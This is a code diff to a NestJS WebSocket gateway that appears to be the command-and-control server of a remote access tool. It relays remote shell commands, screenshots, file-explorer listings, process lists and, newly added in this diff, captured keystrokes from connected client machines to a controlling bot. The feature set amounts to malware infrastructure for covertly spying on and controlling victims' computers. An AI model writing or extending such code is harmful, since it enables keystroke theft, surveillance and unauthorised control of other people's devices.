@@ -18,6 +18,8 @@ import type {
   GetScreensFromClientEvent,
   RunCmdCommand,
   GetScreenshotFromClientEvent,
+  GetKeyloggerFromClientEvent,
+  MessageToBotEvent,
 } from "../types/ws-client-events.type";
 import type { FileRequest } from "../types/tasks.type";
 import { UseGuards } from "@nestjs/common";
@@ -30,6 +32,10 @@ import Redis from "ioredis";
 import { InjectRedis } from "@nestjs-modules/ioredis";
 import path from "path";
 import { RedisRepository } from "@/src/repository/redis/domain/redis.repository";
+import { CommandsGuard } from "../../client/domain/commands.guard";
+import { SetCommand } from "../../client/domain/commands.decorator";
+import { WsBotKeyLoggerUseCase } from "../../ws-bot/application/events/ws-bot-keylogger.use-case";
+import { WsBotSendMessageUseCase } from "../../ws-bot/application/events/ws-bot-send-message.use-case";
 
 @WebSocketGateway({
   namespace: "clients",
@@ -46,26 +52,30 @@ export class WsClientGateway
     private readonly wsClientLeavesUseCase: WsClientLeavesUseCase,
     private readonly wsClientResetAllConnectionsUseCase: WsClientResetAllConnectionsUseCase,
     private readonly wsBotScreenshotUseCase: WsBotScreenshotUseCase,
+
+    private readonly wsBotSendTasksUseCase: WsBotSendTasksUseCase,
     private readonly wsBotSendCmdCommandUseCase: WsBotSendCommandUseCase,
     private readonly wsBotSendExplorerUseCase: WsBotSendExplorerUseCase,
-    private readonly wsBotSendTasksUseCase: WsBotSendTasksUseCase,
+    private readonly wsBotKeyloggerUseCase: WsBotKeyLoggerUseCase,
+    private readonly wsBotSendMessageUseCase: WsBotSendMessageUseCase,
     private readonly logger: LoggerService,
     private readonly redisRepository: RedisRepository,
+    @InjectRedis() private readonly redis: Redis,
   ) {}
 
-  async sendEventToClient(clientid: string, event: string, payload: any) {
+  async sendEventToClient(clientid: string, event: string, payload?: any) {
     // const client = this.server.sockets.sockets.get(clientid);
     // console.log("client", client);
     // if (client) {
     //   client.emit(event, payload);
     // }
 
-    const connectionid = await this.redisRepository.getEntity(
-      "ws-client-id",
-      clientid,
+    const connectionid = await this.redisRepository.HGET(
+      ["ws", [clientid]],
+      "client",
     );
 
-    console.log("connectionid", connectionid);
+    // console.log("connectionid", connectionid);
     if (!connectionid) return;
     this.server.to(connectionid).emit(event, payload);
   }
@@ -73,40 +83,48 @@ export class WsClientGateway
   async afterInit(client: Socket) {
     this.logger.info("Resetting all client connections");
     await this.wsClientResetAllConnectionsUseCase.execute();
-    await this.redisRepository.deleteAllFromCategory("ws-client-id");
   }
 
   async handleConnection(client: Socket) {
+    const { clientid } = await this.wsClientJoinsUseCase.execute(client);
     try {
-      console.log(this.server);
-      const { clientid } = await this.wsClientJoinsUseCase.execute(client);
+      // console.log(this.server);
 
       // console.log("clientid", this.server.sockets);
-      this.redisRepository.setEntity("ws-client-id", clientid, client.id);
       this.server.to(client.id).emit("connected", "connected");
     } catch (error) {
       this.logger.error("Connection error:", error);
       client.disconnect();
+      return;
     }
+
+    await this.redisRepository.HDEL(["client-commands-requests"], clientid);
+
+    await this.redisRepository.HSET(["ws", [clientid]], {
+      client: client.id,
+    });
   }
 
-  handleDisconnect(client: Socket) {
+  async handleDisconnect(client: Socket) {
     try {
       this.wsClientLeavesUseCase.execute(client);
+      const clientid = client.handshake.query["clientid"] as string;
+      const controllerid = client.handshake.query["controllerid"] as string;
+
+      await this.redisRepository.HDEL(["ws", [clientid]], "client");
+      await this.redisRepository.HDEL(["connection-ws"], controllerid);
+
+      await this.redisRepository.HSET(["client-commands-requests"], {
+        [clientid]: [],
+      });
     } catch (error) {
       this.logger.error("Connection error:", error);
       client.disconnect();
     }
-
-    const clientid = client.handshake.query["clientid"] as string;
-    const controllerid = client.handshake.query["controllerid"] as string;
-
-    this.redisRepository.deleteEntity("ws-client-id", clientid);
-
-    this.redisRepository.deleteEntity("connection-ws", controllerid);
   }
 
-  @UseGuards(WsClientGuard)
+  @UseGuards(WsClientGuard, CommandsGuard)
+  @SetCommand("shell")
   @SubscribeMessage("runCmdCommand")
   runCmdCommand(client: Socket, data: RunCmdCommand) {
     this.wsBotSendCmdCommandUseCase.execute({
@@ -115,20 +133,29 @@ export class WsClientGateway
     });
   }
 
-  @UseGuards(WsClientGuard)
+  @UseGuards(WsClientGuard, CommandsGuard)
+  @SetCommand("screenshot")
   @SubscribeMessage("getScreensFromClient")
-  getScreensFromClient(client: Socket, data: GetScreensFromClientEvent) {
+  async getScreensFromClient(client: Socket, data: GetScreensFromClientEvent) {
     this.logger.info("getScreensFromClient", data);
+
+    const messageid = await this.redisRepository.HGET(
+      ["messages-bot"],
+      data.identifier,
+    );
+
     this.wsBotScreenshotUseCase.sendScreens({
       controllerid: client.handshake.query.controllerid as string,
       screens: data.screens,
+      identifier: messageid ?? "",
     });
   }
 
-  @UseGuards(WsClientGuard)
+  @UseGuards(WsClientGuard, CommandsGuard)
+  @SetCommand("screenshot")
   @SubscribeMessage("getScreenshotFromClient")
   getScreenshotFromClient(client: Socket, data: GetScreenshotFromClientEvent) {
-    this.logger.info("getScreensFromClient", data);
+    this.logger.info("getScreensFromClient");
     // this.wsBotSendScreensUseCase.execute({
     //   controllerid: client.handshake.query.controllerid as string,
     //   screens: data.screens,
@@ -140,7 +167,8 @@ export class WsClientGateway
     });
   }
 
-  @UseGuards(WsClientGuard)
+  @UseGuards(WsClientGuard, CommandsGuard)
+  @SetCommand("explorer")
   @SubscribeMessage("getFilesFolder")
   async getExplorerFromClient(
     client: Socket,
@@ -150,26 +178,34 @@ export class WsClientGateway
 
     const { files, folder, relativepath } = data;
 
-    const { clientid } = client.handshake.query;
+    const { clientid } = client.handshake.query as {
+      clientid: string;
+      controllerid: string;
+    };
 
     const splitedPath = relativepath.split("/")[1] ?? relativepath;
 
-    const resultPath = path.join(folder, splitedPath);
+    const pathSplited = splitedPath.split(folder);
 
-    const key = `${clientid}:${resultPath}`;
-    console.log("key", key);
+    console.log("pathSplited", pathSplited);
+    let resultPath = "";
+    if (pathSplited.length > 1) {
+      resultPath = path.join(folder, pathSplited[1]);
+      // const resultPath = path.join(folder, splitedPath);
+    } else {
+      resultPath = folder;
+    }
+
+    console.log("resultPath", resultPath);
     // const timeKey = `${key}:timestamp`;
 
-    void this.redisRepository.setEntity(
-      "explorer",
-      key,
-      JSON.stringify(files),
+    await this.redisRepository.HSET(
+      ["explorer", [clientid]],
+      {
+        [resultPath]: JSON.stringify(files),
+      },
       true,
     );
-
-    // await this.redis.set(key, JSON.stringify(files), "EX", 3600);
-
-    // await this.redis.set(timeKey, Date.now(), "EX", 3600);
 
     this.wsBotSendExplorerUseCase.execute({
       controllerid: client.handshake.query.controllerid as string,
@@ -178,18 +214,7 @@ export class WsClientGateway
   }
 
   @UseGuards(WsClientGuard)
-  @SubscribeMessage("getFileFromClient")
-  getFileFromClient(client: Socket, data: FileRequest) {
-    const { metadata } = data;
-
-    const size = metadata.size;
-
-    if (size > 10) {
-      this.logger.error("File too big");
-    }
-  }
-
-  @UseGuards(WsClientGuard)
+  @SetCommand("process")
   @SubscribeMessage("getTasksFromClient")
   getTasksFromClient(client: Socket, data: TasksEvent) {
     this.wsBotSendTasksUseCase.execute({
@@ -197,5 +222,28 @@ export class WsClientGateway
 
       ...data,
     });
+  }
+
+  @UseGuards(WsClientGuard, CommandsGuard)
+  @SetCommand("keylogger")
+  @SubscribeMessage("keylogger:get-keys")
+  getKeyloggerFromClient(client: Socket, data: GetKeyloggerFromClientEvent) {
+    this.logger.info("getKeyloggerFromClient", data);
+
+    this.wsBotKeyloggerUseCase.sendKeyLoggerToBot(
+      client.handshake.query.controllerid as string,
+      data.keys,
+    );
+  }
+
+  @UseGuards(WsClientGuard)
+  @SubscribeMessage("message")
+  sendMessageToBot(client: Socket, data: MessageToBotEvent) {
+    this.logger.info("Send message to bot", data);
+
+    this.wsBotSendMessageUseCase.execute(
+      client.handshake.query.controllerid as string,
+      data,
+    );
   }
 }
